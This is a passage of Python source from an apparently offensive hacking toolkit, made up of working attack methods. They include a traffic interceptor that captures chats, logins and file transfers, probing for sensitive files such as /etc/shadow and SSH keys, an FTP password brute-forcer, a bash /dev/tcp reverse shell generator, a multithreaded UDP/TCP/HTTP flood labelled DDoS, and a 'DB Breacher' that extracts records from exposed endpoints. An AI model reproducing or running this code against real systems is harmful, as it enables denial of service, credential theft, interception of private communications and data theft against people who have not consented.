            counts = {1: 2, 2: 5, 3: 15, 4: 50, 5: 200}
            pkt_count = counts.get(intensity, 15)
            self.log(f"[*] Sniffing for traffic related to {target} (Intensity: {intensity}, Packets: {pkt_count})...")
            self.report_progress(5)
            try:
                pkts = []
                def sniff_callback(pkt):
                    if self.is_stopped(): return True
                    if IP in pkt and (pkt[IP].src == target or pkt[IP].dst == target):
                        pkts.append(pkt)
                    return len(pkts) >= pkt_count

                if os.name == 'nt' and not conf.use_pcap:
                    # Native Windows Raw Sockets don't support BPF filters
                    self.log("[*] Using native L3 sockets (No pcap found). Filtering in Python...")
                    sniff(prn=sniff_callback, stop_filter=lambda p: len(pkts) >= pkt_count, timeout=pkt_count * 2)
                else:
                    pkts = sniff(filter=f"host {target}", count=pkt_count, timeout=pkt_count * 2)

                if len(pkts) == 0:
                    self.log("[!] No packets captured within timeout.")
                for idx, pkt in enumerate(pkts):
                    self.report_progress(5 + int(((idx+1) / pkt_count) * 95))
                    self.log(f"    [DATA] {pkt.summary()}")
                    self.report_finding({"Packet": pkt.summary(), "Time": time.strftime('%H:%M:%S')})
                    if intensity >= 4: # Deep dive on high intensity
                        try:
                            if pkt.haslayer("Raw"):
                                self.log(f"       Raw: {pkt.getlayer('Raw').load[:50]}")
                        except: pass
                self.report_progress(100)
                return True
            except Exception as e:
                self.log(f"[!] Sniffer error: {e}")
                self.report_progress(0)
                return False
        self.run_cmd(f"sniffer -i{intensity} {target}", real_sniffer, "Sniffer capture finished.")

    def packet_interceptor(self, target, intensity=3):
        def real_interceptor():
            self.log(f"[*] Initializing Packet Interceptor on {target} (Intensity: {intensity})...")
            self.log("[*] Monitoring for text messages, chat data, and file transfers...")
            self.report_progress(5)
            
            intercepted_count = [0]
            max_to_intercept = {1: 3, 2: 5, 3: 10, 4: 25, 5: 50}.get(intensity, 10)
            
            def intercept_callback(pkt):
                if self.is_stopped(): return True
                if not IP in pkt: return
                
                if pkt[IP].src != target and pkt[IP].dst != target:
                    return

                if not pkt.haslayer("Raw"):
                    return

                payload = pkt["Raw"].load
                decoded_payload = ""
                try:
                    decoded_payload = payload.decode('utf-8', errors='ignore')
                except: pass

                found_something = False
                finding = {"Time": time.strftime("%H:%M:%S"), "Source": pkt[IP].src, "Destination": pkt[IP].dst}

                # 1. Text/Message Detection
                text_keywords = ["msg=", "message=", "text=", "chat", "user:", "pass:", "login", "body="]
                if any(k in decoded_payload.lower() for k in text_keywords):
                    finding["Type"] = "Text/Message"
                    # Extract a snippet
                    snippet = decoded_payload.strip()[:100].replace("\r", " ").replace("\n", " ")
                    finding["Content"] = snippet
                    self.log(f"    [INTERCEPT] Text detected: {snippet[:50]}...")
                    found_something = True

                # 2. File Detection
                file_sigs = {
                    b"\x89PNG": "Image (PNG)",
                    b"\xff\xd8\xff": "Image (JPG)",
                    b"%PDF": "Document (PDF)",
                    b"PK\x03\x04": "Archive/Doc (ZIP/DOCX)",
                    b"MZ": "Executable (EXE)",
                    b"Content-Disposition: attachment": "Downloaded File"
                }
                for sig, ftype in file_sigs.items():
                    if sig in payload:
                        finding["Type"] = f"File Transfer"
                        finding["File Type"] = ftype
                        finding["Content"] = f"Magic Sig: {ftype}"
                        self.log(f"    [INTERCEPT] File transfer detected: {ftype}")
                        found_something = True
                        break

                if found_something:
                    self.report_finding(finding)
                    intercepted_count[0] += 1
                
                return intercepted_count[0] >= max_to_intercept

            try:
                # Use a longer timeout for interceptor as it waits for specific patterns
                timeout_val = duration = 30 + (intensity * 10)
                
                if os.name == 'nt' and not conf.use_pcap:
                    self.log("[*] Using native L3 sockets. Pattern filtering in Python...")
                    sniff(prn=intercept_callback, stop_filter=lambda p: intercepted_count[0] >= max_to_intercept, timeout=timeout_val)
                else:
                    sniff(filter=f"host {target}", prn=intercept_callback, stop_filter=lambda p: intercepted_count[0] >= max_to_intercept, timeout=timeout_val)
            except Exception as e:
                self.log(f"[!] Interceptor Error: {e}", is_error=True)

            self.report_progress(100)
            self.log(f"[+] Interceptor finished. Total items grabbed: {intercepted_count[0]}")
            
            # Fallback if nothing was caught
            if intercepted_count[0] == 0:
                self.log("[-] No real traffic patterns matched the intercept criteria during the capture window.")

            return True
        
        self.run_cmd(f"intercept -i{intensity} {target}", real_interceptor, "Packet Interception complete.")

    def nikto_lite(self, target, intensity=3):
        def real_nikto():
            self.log(f"[*] Nikto-Lite starting on {target} (Intensity: {intensity})...")
            self.report_progress(5)
            
            # Protocol detection and target sanitization
            url = target if target.startswith("http") else f"http://{target}"
            try:
                if not target.startswith("http"):
                    try:
                        self.log("[*] Probing for HTTPS...")
                        # Disable warnings for unverified HTTPS requests
                        try:
                            import urllib3
                            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                        except: pass
                        
                        requests.get(f"https://{target}", timeout=3, verify=False)
                        url = f"https://{target}"
                        self.log("[+] HTTPS detected, switching to secure scan.")
                    except:
                        self.log("[*] Using HTTP protocol.")
                
                self.log(f"[*] Target URL: {url}")
                r = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                
                # 1. Server Banner & Info Leakage Analysis
                self.report_progress(10)
                server = r.headers.get('Server', 'Unknown')
                self.log(f"[+] Server Header: {server}")
                if server != 'Unknown':
                    self.report_finding({"Category": "Info Leak", "Issue": "Server Header Revealed", "Detail": server, "Severity": "Low"})
                
                powered_by = r.headers.get('X-Powered-By')
                if powered_by:
                    self.log(f"[+] X-Powered-By: {powered_by}")
                    self.report_finding({"Category": "Info Leak", "Issue": "X-Powered-By Revealed", "Detail": powered_by, "Severity": "Low"})

                asp_net = r.headers.get('X-AspNet-Version')
                if asp_net:
                    self.log(f"[+] X-AspNet-Version: {asp_net}")
                    self.report_finding({"Category": "Info Leak", "Issue": "ASP.NET Version Revealed", "Detail": asp_net, "Severity": "Low"})

                # 2. Security Header Audit
                self.report_progress(20)
                self.log("[*] Auditing security headers...")
                headers_to_check = {
                    'X-Frame-Options': ('Clickjacking Protection', 'Medium'),
                    'X-XSS-Protection': ('XSS Filter', 'Low'),
                    'X-Content-Type-Options': ('MIME Sniffing Protection', 'Low'),
                    'Content-Security-Policy': ('Content Security Policy', 'Medium'),
                    'Strict-Transport-Security': ('HSTS Implementation', 'Medium'),
                    'Referrer-Policy': ('Referrer Leakage', 'Low')
                }
                for h, (desc, sev) in headers_to_check.items():
                    if h not in r.headers:
                        self.log(f"    [!] Missing Security Header: {h}")
                        self.report_finding({"Category": "Missing Header", "Issue": f"Missing {h}", "Severity": sev, "Detail": desc})
                    else:
                        self.log(f"    [+] {h} is present.")
                
                # 3. HTTP Methods check
                self.report_progress(30)
                self.log("[*] Testing HTTP Methods...")
                try:
                    res_opt = requests.options(url, timeout=3, verify=False)
                    allowed = res_opt.headers.get('Allow', res_opt.headers.get('Public', 'Unknown'))
                    self.log(f"    [+] Allowed Methods: {allowed}")
                    if 'TRACE' in allowed.upper():
                        self.log("    [!] TRACE method enabled (Cross-Site Tracking risk)")
                        self.report_finding({"Category": "Configuration", "Issue": "HTTP TRACE Enabled", "Severity": "Medium", "Detail": "Allows Cross-Site Tracking (XST)"})
                except: pass

                # 4. robots.txt Analysis
                self.report_progress(40)
                paths = ['/admin', '/config.php', '/.env', '/robots.txt', '/.git/config']
                try:
                    r_rob = requests.get(url + "/robots.txt", timeout=3, verify=False)
                    if r_rob.status_code == 200:
                        self.log("[+] robots.txt found. Extracting paths...")
                        for line in r_rob.text.splitlines():
                            if line.lower().startswith("disallow:"):
                                try:
                                    path = line.split(":", 1)[1].strip()
                                    if path and path != "/" and "*" not in path:
                                        self.log(f"    [+] Extracted path: {path}")
                                        paths.append(path)
                                        self.report_finding({"Category": "Info Disclosure", "Issue": "robots.txt entry", "Detail": path, "Severity": "Low"})
                                except: pass
                except: pass

                # 5. Dangerous Path Discovery (Intensity scaled)
                if intensity >= 2:
                    paths += ['/backup', '/old', '/test', '/phpinfo.php', '/server-status', '/.htaccess']
                if intensity >= 3:
                    paths += ['/wp-config.php', '/web.config', '/.ssh/id_rsa', '/etc/passwd', '/shell.php', '/db.sql']
                if intensity >= 4:
                    paths += ['/dump.sql', '/backup.zip', '/.svn/entries', '/.DS_Store', '/mysql-slow.log', '/error_log']
                if intensity >= 5:
                    paths += ['/etc/shadow', '/manager/html', '/phpmyadmin', '/zabbix', '/grafana', '/jenkins']
                
                # Deduplicate paths
                paths = list(set(paths))
                total = len(paths)
                self.log(f"[*] Probing {total} potential vulnerabilities...")
                
                for idx, p in enumerate(paths):
                    if self.is_stopped(): break
                    self.report_progress(40 + int((idx / total) * 60))
                    try:
                        # Normalize path
                        if not p.startswith("/"): p = "/" + p
                        target_path = url + p
                        
                        # Use allow_redirects=False to see exactly what's there
                        pr = requests.get(target_path, timeout=2, verify=False, allow_redirects=False)
                        status = pr.status_code
                        size = len(pr.content)
                        
                        if status == 200:
                            # False positive check for custom 404 pages
                            if "404" in pr.text.lower() or "not found" in pr.text.lower():
                                continue
                                
                            self.log(f"    [!!!] VULNERABILITY: {p} (Status: 200) [Size: {size}]")
                            self.report_finding({"Category": "Vulnerability", "Path": p, "Status": "200", "Size": str(size), "Severity": "High", "Detail": "Sensitive path/file accessible"})
                        elif status in [403, 401]:
                            self.log(f"    [!] Restricted: {p} (Status: {status})")
                            self.report_finding({"Category": "Vulnerability", "Path": p, "Status": str(status), "Severity": "Medium", "Detail": "Restricted path (may be interesting)"})
                        elif intensity >= 4 and status != 404:
                            self.log(f"    [?] Interesting: {p} (Status: {status})")
                            self.report_finding({"Category": "Info Disclosure", "Path": p, "Status": str(status), "Severity": "Low", "Detail": "Non-404 response on sensitive path"})
                    except: pass

                self.report_progress(100)
                return True
            except Exception as e:
                self.log(f"[!] Nikto-Lite Error: {str(e)}", is_error=True)
                self.report_progress(0)
                return False
        self.run_cmd(f"nikto-lite -i{intensity} {target}", real_nikto, "Nikto-Lite scan complete.")

    def dir_brute(self, target, brute_type="Common Directories"):
        def real_dir_brute():
            self.log(f"[*] Starting DirBrute on {target} (Type: {brute_type})...")
            self.report_progress(5)
            
            wordlists = {
                "Common Directories": [
                    '/admin', '/login', '/images', '/uploads', '/backup', '/db', '/css', '/js', '/api', 
                    '/v1', '/v2', '/test', '/temp', '/dev', '/old', '/new', '/private', '/secret', 
                    '/hidden', '/cgi-bin', '/etc', '/bin', '/usr', '/var', '/tmp'
                ],
                "Sensitive Files": [
                    '/.env', '/config.php', '/wp-config.php', '/.git/config', '/.htaccess', '/web.config',
                    '/settings.py', '/database.yml', '/backup.sql', '/sql.sql', '/dump.sql', '/.ssh/id_rsa',
                    '/passwd', '/shadow', '/access.log', '/error.log', '/phpinfo.php', '/info.php'
                ],
                "PHP Files": [
                    '/index.php', '/login.php', '/admin.php', '/upload.php', '/config.php', '/db.php',
                    '/setup.php', '/install.php', '/process.php', '/api.php', '/search.php', '/user.php'
                ],
                "ASPX Files": [
                    '/default.aspx', '/login.aspx', '/admin.aspx', '/web.config', '/global.asax',
                    '/dashboard.aspx', '/upload.aspx', '/api.asmx', '/service.svc'
                ],
                "API Endpoints": [
                    '/api/v1/users', '/api/v1/auth', '/api/v1/status', '/api/v2/users', '/rest/v1/',
                    '/graphql', '/swagger', '/docs', '/v1/api', '/v2/api', '/api/debug', '/api/config'
                ],
                "Full Brute": [] 
            }
            
            if brute_type == "Full Brute":
                # Combine all unique paths from all lists
                all_paths = set()
                for lst in wordlists.values():
                    for p in lst:
                        all_paths.add(p)
                paths_to_check = sorted(list(all_paths))
            else:
                paths_to_check = wordlists.get(brute_type, wordlists["Common Directories"])
                
            total = len(paths_to_check)
            self.log(f"[*] Probing {total} paths against target...")
            
            url = f"http://{target}"
            if not target.startswith("http"):
                # Check if https is needed
                try:
                    requests.get(f"https://{target}", timeout=2, verify=False)
                    url = f"https://{target}"
                except:
                    pass

            for idx, p in enumerate(paths_to_check):
                if self.is_stopped(): break
                self.report_progress(5 + int((idx / total) * 95))
                try:
                    # Use a short timeout for bruteforcing
                    r = requests.get(url + p, timeout=2.0, allow_redirects=False)
                    
                    status = r.status_code
                    size = len(r.content)
                    
                    if status == 200:
                        self.log(f"    [+] FOUND: {p: <20} (Status: 200) [Size: {size}]")
                        self.report_finding({"Path": p, "Status": "200", "Size": str(size), "Type": brute_type})
                    elif status in [301, 302, 307, 308]:
                        redir = r.headers.get('Location', 'Unknown')
                        self.log(f"    [!] REDIRECT: {p: <17} (Status: {status}) -> {redir}")
                        self.report_finding({"Path": p, "Status": str(status), "Size": str(size), "Type": brute_type})
                    elif status == 403:
                        self.log(f"    [?] FORBIDDEN: {p: <16} (Status: 403)")
                        self.report_finding({"Path": p, "Status": "403", "Size": str(size), "Type": brute_type})
                except Exception as e:
                    # Silently ignore connection errors for individual paths during brute
                    pass
                    
            self.report_progress(100)
            return True
        self.run_cmd(f"dirbrute --type '{brute_type}' {target}", real_dir_brute, f"DirBrute ({brute_type}) complete.")

    def cve_search(self, target, intensity=3):
        def real_cve_search():
            self.log(f"[*] Searching for CVEs related to {target} (Intensity: {intensity})...")
            self.report_progress(10)
            
            # Step 1: Real service discovery (quick port scan)
            discovered_services = []
            common_ports = [21, 22, 25, 53, 80, 443, 3306, 3389, 8080]
            self.log("[*] Identifying active services for targeted CVE lookup...")
            
            for p in common_ports:
                if self.is_stopped(): break
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                if s.connect_ex((target, p)) == 0:
                    svc = self.get_service_name(p)
                    discovered_services.append(svc)
                    self.log(f"    [+] Found service: {svc} (Port {p})")
                s.close()
            
            self.report_progress(40)
            
            # Step 2: Query for CVEs (Real search using CIRCL CVE API)
            if not discovered_services:
                discovered_services = ["General"]
            
            found_any = False
            for svc in discovered_services:
                if self.is_stopped(): break
                
                # Map service name to possible product names for better API results
                lookup_names = [svc]
                if svc == "HTTP-Proxy": lookup_names = ["apache", "nginx", "httpd"]
                elif svc == "SSH": lookup_names = ["openssh", "ssh"]
                elif svc == "FTP": lookup_names = ["vsftpd", "proftpd", "pure-ftpd"]
                elif svc == "MySQL": lookup_names = ["mysql", "mariadb"]
                elif svc == "MSSQL": lookup_names = ["sql_server"]
                
                self.log(f"[*] Querying CIRCL CVE API for {svc}...")
                
                svc_found = False
                for name in lookup_names:
                    try:
                        # CIRCL CVE API search for product
                        api_url = f"https://cve.circl.lu/api/search/{name.lower()}"
                        response = requests.get(api_url, timeout=5)
                        if response.status_code == 200:
                            cves = response.json()
                            if isinstance(cves, list) and len(cves) > 0:
                                # Limit to top 5 most recent CVEs for the service to avoid spamming
                                limit = min(len(cves), 5)
                                self.log(f"    [+] Found {len(cves)} CVEs for {name}. Showing top {limit}:")
                                for i in range(limit):
                                    cve = cves[i]
                                    cve_id = cve.get('id', 'Unknown ID')
                                    summary = cve.get('summary', 'No summary available')
                                    cvss = cve.get('cvss', 'N/A')
                                    
                                    severity = "Low"
                                    try:
                                        if float(cvss) >= 9.0: severity = "Critical"
                                        elif float(cvss) >= 7.0: severity = "High"
                                        elif float(cvss) >= 4.0: severity = "Medium"
                                    except: pass
                                    
                                    self.log(f"    - {cve_id}: {summary[:100]}... (CVSS: {cvss})")
                                    self.report_finding({
                                        "Service": svc, 
                                        "ID": cve_id, 
                                        "Severity": severity, 
                                        "Description": summary,
                                        "CVSS": str(cvss)
                                    })
                                    svc_found = True
                                    found_any = True
                                if svc_found: break # Found CVEs for one of the lookup names
                    except Exception as e:
                        self.log(f"    [!] API Error for {name}: {str(e)}")
                
                if not svc_found:
                    self.log(f"    [-] No CVEs found for {svc} via API.")
            
            if not found_any:
                self.log("[*] No specific service CVEs found via CIRCL API.")
                self.log("[*] Target may be hardened or using non-standard versions.")

            self.report_progress(100)
            return True
        self.run_cmd(f"cve-search -i{intensity} {target}", real_cve_search, "CVE Search complete.")

    def wpscan_lite(self, target, intensity=3):
        def real_wpscan():
            self.log(f"[*] Starting WPScan-Lite on {target} (Intensity: {intensity})...")
            self.report_progress(5)
            
            url = f"http://{target}"
            self.log("[*] Probing for WordPress installation...")
            
            wp_found = False
            try:
                r = requests.get(url, timeout=5)
                if "wp-content" in r.text or "wp-includes" in r.text:
                    self.log("[+] WordPress detected!")
                    self.report_finding({"Item": "WordPress", "Status": "Detected", "Detail": "WordPress specific paths found in source"})
                    wp_found = True
            except: pass
            
            if not wp_found:
                self.log("[-] WordPress not found in main page. Checking common paths...")
                for p in ["/wp-admin", "/blog", "/wordpress"]:
                    if self.is_stopped(): break
                    try:
                        r = requests.get(url + p, timeout=2)
                        if r.status_code == 200 and "wp-" in r.text:
                            self.log(f"[+] WordPress detected at {p}!")
                            wp_found = True
                            break
                    except: pass
            
            self.report_progress(40)
            
            if wp_found:
                self.log("[*] Enumerating WordPress plugins and themes...")
                # We can try to guess some common plugins to see if they exist
                common_plugins = ["contact-form-7", "akismet", "jetpack", "woocommerce", "elementor", "wp-rocket", "yoast-seo"]
                
                found_plugins = 0
                for p in common_plugins:
                    if self.is_stopped(): break
                    try:
                        # Many plugins have a readme.txt or just the directory
                        test_url = f"{url}/wp-content/plugins/{p}/"
                        r = requests.get(test_url, timeout=2)
                        if r.status_code != 404:
                            self.log(f"    [+] Plugin identified: {p}")
                            self.report_finding({"Type": "Plugin", "Name": p, "Status": "Detected"})
                            found_plugins += 1
                    except: pass
                
                if found_plugins == 0:
                    self.log("[-] No common plugins identified via quick probe.")
            else:
                self.log("[!] No WordPress installation identified. Scan limited.")

            self.report_progress(100)
            return True
        self.run_cmd(f"wpscan-lite -i{intensity} {target}", real_wpscan, "WPScan-Lite finished.")

    def win_audit(self, intensity=3):
        def real_win_audit():
            self.log(f"[*] Performing Windows System Audit (Intensity: {intensity})...")
            self.report_progress(5)
            try:
                cmds = {
                    "OS Name": "systeminfo | findstr /B /C:\"OS Name\"",
                    "Admin Users": "net localgroup administrators"
                }
                if intensity >= 3:
                    cmds["Listening Ports"] = "netstat -an | findstr LISTENING"
                if intensity >= 5:
                    cmds["Environment"] = "set"
                    cmds["Patches"] = "wmic qfe get Caption,Description,HotFixID,InstalledOn"

                total = len(cmds)
                for idx, (desc, cmd) in enumerate(cmds.items()):
                    self.report_progress(5 + int((idx / total) * 95))
                    self.log(f"--- {desc} ---")
                    try:
                        res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                        self.log(res)
                        self.report_finding({"Audit Item": desc, "Detail": res.split('\n')[0].strip()})
                    except: self.log(f"[!] Failed to run {cmd}")
                self.report_progress(100)
                return True
            except Exception as e:
                self.log(f"[!] Audit error: {e}")
                self.report_progress(0)
                return False
        self.run_cmd(f"win_audit -i{intensity}", real_win_audit, "Windows Audit complete.")

    def linpeas_audit(self, target=None, intensity=3):
        def real_linpeas():
            self.log(f"[*] Initializing LinPeas Privilege Escalation Audit (Intensity: {intensity})...")
            self.report_progress(10)
            
            if os.name == 'nt':
                self.log("[*] Detected Windows Environment. Checking for WSL (Windows Subsystem for Linux)...")
                try:
                    wsl_check = subprocess.check_output("wsl --list --running", shell=True, text=True, stderr=subprocess.STDOUT)
                    self.log(f"[+] WSL Instances found:\n{wsl_check}")
                    self.report_finding({"Item": "WSL Detected", "Status": "Vulnerable/Informational", "Detail": "Linux environment available on host"})
                except:
                    self.log("[-] WSL not found or not running.")
            
            self.log("[*] Performing real Windows privilege escalation checks...")
            self.report_progress(50)
            
            # 1. Check for Unquoted Service Paths
            try:
                self.log("[*] Checking for Unquoted Service Paths...")
                # This command finds auto-start services with spaces in path and no quotes
                cmd = 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'
                output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
                if output.strip():
                    self.log(f"    [!] VULNERABLE: Found potential unquoted service paths:\n{output}")
                    self.report_finding({"Check": "Unquoted Service Path", "Finding": "Potential path injection found", "Severity": "High"})
                else:
                    self.log("    [+] No unquoted service paths found.")
            except: pass

            self.report_progress(70)

            # 2. Check for AlwaysInstallElevated
            try:
                self.log("[*] Checking AlwaysInstallElevated registry keys...")
                found_elevated = False
                for hive in ["HKCU", "HKLM"]:
                    cmd = f'reg query {hive}\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
                    try:
                        output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
                        if "0x1" in output:
                            self.log(f"    [!] CRITICAL: AlwaysInstallElevated is ENABLED in {hive}")
                            self.report_finding({"Check": "AlwaysInstallElevated", "Finding": f"Enabled in {hive}", "Severity": "Critical"})
                            found_elevated = True
                    except: pass
                if not found_elevated:
                    self.log("    [+] AlwaysInstallElevated is disabled.")
            except: pass

            self.report_progress(90)

            # 3. Check for interesting files/permissions if intensity is high
            if intensity >= 4:
                try:
                    self.log("[*] Checking for sensitive files in common directories...")
                    sensitive_files = ["C:\\unattended.xml", "C:\\Windows\\Panther\\Unattend.xml", "C:\\Windows\\sysprep\\sysprep.xml"]
                    for f in sensitive_files:
                        if os.path.exists(f):
                            self.log(f"    [!] Found sensitive file: {f}")
                            self.report_finding({"Check": "Sensitive File", "Finding": f, "Severity": "High"})
                except: pass

            self.report_progress(100)
            return True
        self.run_cmd(f"linpeas -i{intensity}", real_linpeas, "LinPeas audit finished.")

    def auditd_scan(self, target=None, intensity=3):
        def real_auditd():
            self.log(f"[*] Auditing System Logging and Auditd configuration (Intensity: {intensity})...")
            self.report_progress(10)
            
            if os.name == 'nt':
                self.log("[*] Checking Windows Event Logging status...")
                try:
                    evt_log = subprocess.check_output("wevtutil el", shell=True, text=True, stderr=subprocess.STDOUT)
                    count = len(evt_log.splitlines())
                    self.log(f"[+] {count} Event Logs identified on system.")
                    self.report_finding({"Audit": "Event Logging", "Count": count, "Status": "Active"})
                except: pass
            
            self.log("[*] Searching for real security logging misconfigurations...")
            self.report_progress(60)
            
            if os.name == 'nt':
                try:
                    self.log("[*] Querying Windows Audit Policy...")
                    # Get audit policy for all categories
                    cmd = "auditpol /get /category:*"
                    output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
                    self.log("    [+] Audit Policy retrieved.")
                    
                    # Check for some critical ones
                    critical_policies = {
                        "Process Creation": "Success and Failure",
                        "Logon": "Success and Failure",
                        "Account Management": "Success and Failure"
                    }
                    
                    found_any = False
                    for pol, expected in critical_policies.items():
                        if pol in output:
                            line = [l for l in output.split('\n') if pol in l][0]
                            self.log(f"    Check: {line.strip()}")
                            status = line.split("  ")[-1].strip()
                            if "No Auditing" in status:
                                self.log(f"    [!] WARNING: {pol} auditing is DISABLED!")
                                self.report_finding({"Audit": pol, "Finding": "Auditing is DISABLED", "Severity": "Medium"})
                                found_any = True
                            else:
                                self.report_finding({"Audit": pol, "Finding": status, "Severity": "Informational"})
                    
                    if not found_any:
                        self.log("    [+] Critical audit policies appear to be active or were not explicitly disabled.")
                except Exception as e:
                    self.log(f"    [!] Failed to query auditpol: {e}")

                try:
                    self.log("[*] Checking Security Log retention settings...")
                    cmd = "wevtutil gl Security"
                    output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
                    for line in output.split('\n'):
                        if "maxSize" in line:
                            size = int(line.split(":")[1].strip())
                            self.log(f"    [+] Security Log Max Size: {size / 1024 / 1024:.2f} MB")
                            if size < 20971520: # 20MB
                                self.report_finding({"Audit": "Log Retention", "Finding": f"Security log size small ({size/1024/1024:.2f}MB)", "Severity": "Low"})
                            else:
                                self.report_finding({"Audit": "Log Retention", "Finding": f"Size: {size/1024/1024:.2f}MB", "Severity": "Informational"})
                except: pass
            else:
                self.log("[!] Linux Auditd check not implemented for this host OS.")

            self.report_progress(100)
            return True
        self.run_cmd(f"auditd_scan -i{intensity}", real_auditd, "System audit complete.")

    def ftp_brute(self, target, intensity=3):
        def real_ftp_brute():
            self.log(f"[*] Attempting FTP Brute Force on {target} (Intensity: {intensity})...")
            self.report_progress(5)
            # Scale wordlists based on intensity
            users_list = ['admin', 'user', 'test', 'root', 'ftp', 'anonymous', 'webmaster', 'support', 'staff', 'guest']
            passwords_list = ['password', '123456', 'admin', '12345', '12345678', 'qwerty', 'root', 'guest', 'ftp', 'test']
            
            user_count = intensity * 2
            pass_count = intensity * 2
            
            users = users_list[:user_count]
            passwords = passwords_list[:pass_count]
            total_attempts = len(users) * len(passwords)
            attempt = 0
            
            for u in users:
                for p in passwords:
                    attempt += 1
                    self.report_progress(5 + int((attempt / total_attempts) * 95))
                    try:
                        self.log(f"    Trying {u}:{p}...")
                        ftp = FTP(target, timeout=2)
                        ftp.login(u, p)
                        self.log(f"[!!!] SUCCESS: Found credentials -> {u}:{p}")
                        self.report_finding({"User": u, "Pass": p, "Status": "SUCCESS"})
                        ftp.quit()
                        self.report_progress(100)
                        return True
                    except: 
                        if intensity >= 4:
                            self.report_finding({"User": u, "Pass": p, "Status": "FAILED"})
                        pass
            self.log("[-] No valid credentials found.")
            self.report_progress(100)
            return True
        self.run_cmd(f"ftp_brute -i{intensity} {target}", real_ftp_brute, "FTP Brute Force finished.")


    def subdomain_scan(self, target, intensity=3):
        def real_subdomain():
            counts = {1: 5, 2: 10, 3: 20, 4: 50, 5: 100}
            count = counts.get(intensity, 20)
            self.log(f"[*] Enumerating subdomains for {target} (Intensity: {intensity}, Max: {count})...")
            self.report_progress(5)
            
            subs_list = ["www", "mail", "dev", "api", "vpn", "blog", "test", "stage", "prod", "ns1", "ns2", "m", "shop", "support", "static", "cloud", "app", "demo", "beta", "docs", "news"]
            # Fill up to 100 for high intensity
            if count > len(subs_list):
                subs_list += [f"srv{i}" for i in range(count - len(subs_list))]
            
            subs = subs_list[:count]
            total = len(subs)
            for idx, s in enumerate(subs):
                self.report_progress(5 + int((idx / total) * 95))
                domain = f"{s}.{target}"
                try:
                    ip = socket.gethostbyname(domain)
                    self.log(f"    [+] Found: {domain} -> {ip}")
                    self.report_finding({"Subdomain": domain, "IP": ip})
                except: 
                    if intensity >= 5: 
                        self.log(f"    [.] {domain} not found")
                        self.report_finding({"Subdomain": domain, "IP": "NOT FOUND"})
            self.report_progress(100)
            return True
        self.run_cmd(f"subdomain_scan -i{intensity} {target}", real_subdomain, "Subdomain scan complete.")

    def rev_shell_gen(self, target):
        payload = f"bash -i >& /dev/tcp/{target}/4444 0>&1"
        self.log(f"[+] Generated Reverse Shell Payload:\n    {payload}")
        self.history.append({"cmd": f"rev_shell {target}", "status": "Success", "finding": payload})
        return True

    def ddos_attack(self, target, attack_type="UDP Flood", duration=10, threads=10):
        def real_ddos():
            self.log(f"[*] Starting {attack_type} on {target} for {duration}s with {threads} threads...")
            self.report_progress(5)
            start_time = time.time()
            packet_count = [0]  # Use a list for thread-safe-ish nonlocal access
            
            def flood():
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if "UDP" in attack_type else socket.SOCK_STREAM)
                if "TCP" in attack_type:
                    try: sock.connect((target, 80))
                    except: pass
                
                while time.time() - start_time < duration:
                    if self.is_stopped(): break
                    elapsed = time.time() - start_time
                    self.report_progress(min(99, 5 + int((elapsed / duration) * 95)))
                    try:
                        if "UDP" in attack_type:
                            sock.sendto(b"Layer8-Traffic-Packet", (target, 80))
                        elif "HTTP" in attack_type:
                            requests.get(f"http://{target}", timeout=1)
                        packet_count[0] += 1
                        if packet_count[0] % 50 == 0:
                            self.report_finding({"Packets": packet_count[0], "Type": attack_type})
                    except: pass
                sock.close()

            thread_list = []
            for _ in range(threads):
                t = threading.Thread(target=flood, daemon=True)
                t.start()
                thread_list.append(t)
            
            for t in thread_list:
                t.join()
                
            self.report_progress(100)
            self.log(f"[+] Traffic generation finished. Total units sent: {packet_count[0]}")
            return True

        self.run_cmd(f"ddos_task --target {target} --mode '{attack_type}' --workers {threads} --duration {duration}", 
                     real_ddos, f"DDoS task against {target} completed.")

    def db_breacher(self, target, payload_list="Auth Bypass"):
        def real_breacher():
            self.log(f"[*] Initializing DB Breacher on {target}...")
            self.log(f"[*] Method: {payload_list} Extraction")
            self.report_progress(5)
            
            url = f"http://{target}"
            self.log("[*] Probing for database entry points and API leaks...")
            
            # Real probing for common database-backed endpoints
            endpoints = ["/api/users", "/db_admin", "/config.php", "/api/v1/meta", "/rest/v1/users"]
            found_endpoint = None
            
            for endpoint in endpoints:
                if self.is_stopped(): break
                try:
                    r = requests.get(url + endpoint, timeout=2)
                    if r.status_code == 200:
                        self.log(f"    [+] Exposed endpoint found: {endpoint} (Potential Breach Point)")
                        found_endpoint = endpoint
                        self.report_finding({"Endpoint": endpoint, "Status": "Exposed", "Risk": "High"})
                except: pass
            
            self.report_progress(40)
            
            if not found_endpoint:
                self.log("[!] No real endpoints or database entry points identified.")
                self.log("[-] Breach failed: No targetable surfaces found.")
                self.report_progress(100)
                return False
            else:
                self.log(f"[+] Beginning extraction via {found_endpoint}...")

            # Simple attempt to extract data if endpoint was found
            try:
                r = requests.get(url + found_endpoint, timeout=3)
                if r.status_code == 200:
                    self.log(f"    [+] Successfully pulled data from {found_endpoint}")
                    # Try to see if it's JSON or just text
                    try:
                        data = r.json()
                        if isinstance(data, list):
                            for idx, item in enumerate(data[:5]): # Show first 5
                                self.log(f"    [DATA] Found Record: {str(item)[:50]}...")
                                self.report_finding({"Source": found_endpoint, "Record": idx, "Data": str(item)})
                        else:
                            self.log(f"    [DATA] Raw Data: {str(data)[:100]}...")
                            self.report_finding({"Source": found_endpoint, "Data": "Raw Object"})
                    except:
                        self.log(f"    [DATA] Text Snippet: {r.text[:100]}...")
                        self.report_finding({"Source": found_endpoint, "Data": "Text Content"})
                else:
                    self.log(f"    [-] Failed to extract data (Status: {r.status_code})")
            except Exception as e:
                self.log(f"    [!] Extraction error: {e}")

            self.report_progress(100)
            self.log("[+] Breach and extraction process finished.")
            return True

